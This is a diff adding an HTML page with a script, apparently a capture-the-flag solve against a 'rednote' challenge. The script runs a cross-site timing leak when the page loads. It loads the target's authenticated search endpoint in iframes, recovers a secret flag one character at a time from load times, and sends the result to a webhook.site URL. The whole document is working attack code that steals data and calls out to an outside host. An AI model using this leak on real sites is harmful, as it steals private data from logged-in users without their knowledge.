@@ -1,0 +1,106 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>rednote xsleak</title>
+<style>body{font-family:system-ui,Segoe UI,Arial;margin:18px;max-width:900px}</style>
+<h3>Rednote XS-Leak runner</h3>
+<pre id="log"></pre>
+<script>
+/*** 配置区 ***/
+const TARGET  = 'http://rednote.1337.sb';                    // ← 如有不同请改
+const WEBHOOK = 'https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac';             // ← 换成你的
+// 典型 CTF flag 字符集（可再精简），大小写都给上，以防题面风格不同
+const CHARSET = 'SEKAICTF{}_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_:.$@';
+// 终止条件
+const MAXLEN = 90;    // flag 最长兜底
+const ROUNDS = 3;     // 每个候选测几次取“中位数”，抗噪更稳（2~5 之间调）
+const GAP_MS = 350;   // 每步停顿，减抖动
+
+const log = (...a)=>{document.querySelector('#log').textContent += a.join(' ')+'\n'}
+const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
+
+/*** 量化 & 统计 ***/
+async function measureOnce(url) {
+  return new Promise((resolve) => {
+    const ifr = document.createElement('iframe');
+    // 防缓存（不同 query 自带差异，再加个随机串更保险）
+    const src = url + (url.includes('?')?'&':'?') + 't=' + Date.now() + Math.random();
+    ifr.referrerPolicy = 'no-referrer';  // 避免把我们域名泄给题目
+    const t0 = performance.now();
+    // 可靠的 onload 基准
+    ifr.onload = () => {
+      const dt = performance.now() - t0;
+      ifr.remove();
+      resolve(dt);
+    };
+    // 兜底：异常 6 秒超时
+    const to = setTimeout(()=>{ try{ifr.remove()}catch(e){}; resolve(6000) }, 6000);
+    ifr.onload = () => { clearTimeout(to); const dt=performance.now()-t0; ifr.remove(); resolve(dt); };
+    ifr.src = src;
+    document.body.appendChild(ifr);
+  });
+}
+async function score(prefixPlusOne) {
+  // 多次测“中位数”更抗抖
+  const url = `${TARGET}/search?query=${encodeURIComponent(prefixPlusOne)}`;
+  const xs = [];
+  for (let i=0;i<ROUNDS;i++) xs.push(await measureOnce(url));
+  xs.sort((a,b)=>a-b);
+  return xs[Math.floor(xs.length/2)];
+}
+
+/*** 自检：cookie 是否随 iframe 发送？（很重要） ***/
+async function selfCheck() {
+  // 思路：/home（登录后有“welcome, xxx”）与 /login（未登录页面）若呈现差异，会体现为不同耗时分布。
+  const h = await score('THIS_PREFIX_SHOULD_NOT_EXIST_12345'); // 先探一枪，顺便热启动
+  let tHome=0, tLogin=0;
+  for (let i=0;i<2;i++) tHome  += await measureOnce(`${TARGET}/home`);
+  for (let i=0;i<2;i++) tLogin += await measureOnce(`${TARGET}/login`);
+  tHome/=2; tLogin/=2;
+  log(`[check] /home ~ ${tHome.toFixed(1)}ms, /login ~ ${tLogin.toFixed(1)}ms`);
+  if (Math.abs(tHome - tLogin) < 30) {
+    log('[warn] /home 与 /login 耗时太接近，可能是 iframe 未带会话（SameSite 不是 None）。仍可尝试，或改走方案 C（先制造“命中更重”的探针）。');
+  } else {
+    log('[ok] 看起来 iframe 带了会话，继续。');
+  }
+}
+
+/*** 主流程：逐字枚举 ***/
+async function run() {
+  await selfCheck();
+
+  let prefix = '';                 // 枚举中的当前前缀
+  // 若你知道 flag 头，如 'SEKAI{'，可先赋值：prefix='SEKAI{';
+
+  // 自适应：我们不知道“命中更慢/更快”，先探“空 vs 非空”作方向判断
+  const tEmpty = await score('THIS_PREFIX_SHOULD_NOT_EXIST_98765');
+  const tHitLike = await score('S'); // 经验里 S/E/C/数字常见
+  const chooseMax = (tHitLike >= tEmpty); // 命中更慢 → 取最大；反之取最小
+  log(`[calib] 空查询 ~${tEmpty.toFixed(1)}ms, 疑似命中 ~${tHitLike.toFixed(1)}ms → 之后将取 ${chooseMax?'最大':'最小'} 耗时`);
+
+  while (prefix.length < MAXLEN) {
+    log(`\n[*] guessing next for prefix="${prefix}"`);
+    let bestChar = null, bestTime = chooseMax ? -1e9 : 1e9;
+
+    for (const c of CHARSET) {
+      const guess = prefix + c;
+      const t = await score(guess);
+      log(`   - ${guess} -> ${t.toFixed(1)} ms`);
+      if ((chooseMax && t > bestTime) || (!chooseMax && t < bestTime)) {
+        bestTime = t; bestChar = c;
+      }
+      await sleep(60); // 候选之间小歇一下
+    }
+    prefix += bestChar;
+    log(`[+] choose "${bestChar}" → prefix="${prefix}" (t=${bestTime.toFixed(1)}ms)`);
+
+    // 终止：右花括号 or 明显越界
+    if (bestChar === '}' || prefix.length >= MAXLEN) break;
+    await sleep(GAP_MS);
+  }
+
+  log(`\n[!] done: ${prefix}`);
+  // 回传
+  (new Image()).src = WEBHOOK + '?flag=' + encodeURIComponent(prefix);
+}
+run();
+</script>
